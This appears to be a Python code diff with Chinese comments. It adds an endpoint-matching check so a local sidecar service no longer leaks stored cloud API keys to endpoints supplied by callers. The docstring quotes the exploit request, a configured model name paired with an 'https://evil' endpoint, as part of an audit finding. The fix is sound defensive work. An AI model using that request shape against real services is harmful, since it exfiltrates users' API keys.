@@ -3,12 +3,42 @@
 _resolve_api_target / _get_best_cloud_config：决定这一轮打到本地引擎还是云端、
 用哪份协议头。它依赖 config.json（CONFIG_FILE 仍归枢纽），所以按惰性导入取用。
 """
+import json
 import logging
 
-import json
 import local_llm
 
 logger = logging.getLogger("latiao-sidecar")   # 与 agent_loop 同名：日志格式不变
+
+
+def _lookup_cloud_key(cloud_config: dict) -> str:
+    """从 config.json 的 cloud_models 回填 API key（密钥代理化：UI 不持明文）。
+
+    **只认 endpoint 逐字节一致（规范化尾斜杠后）**，不做按名称回填——2026-10-11
+    安全审计实测成立的外传通道：此前 `ep 匹配 or name 匹配` 即回填，而 endpoint
+    来自调用方请求体。构造 {"name": <已配置模型名>, "endpoint": "https://evil"}
+    就能把存量 key 发到攻击者地址（本机实测复现）。修法：地址不同一律不回填；
+    name 仅作同一地址下（同址多模型）的消歧；调用方没给 endpoint 时也不回填。
+    """
+    try:
+        from config import CONFIG_FILE
+        cfg = json.loads(CONFIG_FILE.read_text("utf-8"))
+        models = cfg.get("cloud_models") or []
+        ep = (cloud_config.get("endpoint") or "").rstrip("/")
+        if not ep:
+            return ""
+        name = cloud_config.get("name") or cloud_config.get("model") or ""
+        for m in models:
+            if not isinstance(m, dict):
+                continue
+            if (m.get("endpoint") or "").rstrip("/") != ep:
+                continue                      # 地址不同 → 绝不回填
+            if name and m.get("name") != name and m.get("model") != name:
+                continue                      # 同址多模型：名称对不上继续找
+            return str(m.get("key") or "")
+    except Exception:
+        logger.debug("cloud key lookup failed", exc_info=True)
+    return ""
 
 async def _resolve_api_target(cloud_config: dict | None) -> tuple[str, str, dict, bool]:
     """Resolve API URL, protocol, headers, and whether it's a local LLM (no cloud config).
@@ -21,6 +51,8 @@ async def _resolve_api_target(cloud_config: dict | None) -> tuple[str, str, dict
         api_url = cloud_config["endpoint"].rstrip("/") + "/chat/completions"
         headers = {"Content-Type": "application/json"}
         key = cloud_config.get("key", "")
+        if not key and protocol != "local":
+            key = _lookup_cloud_key(cloud_config)
         if key and protocol != "local":
             headers["Authorization"] = f"Bearer {key}"
         # If the endpoint points to a local server, treat as cloud (native function calling)
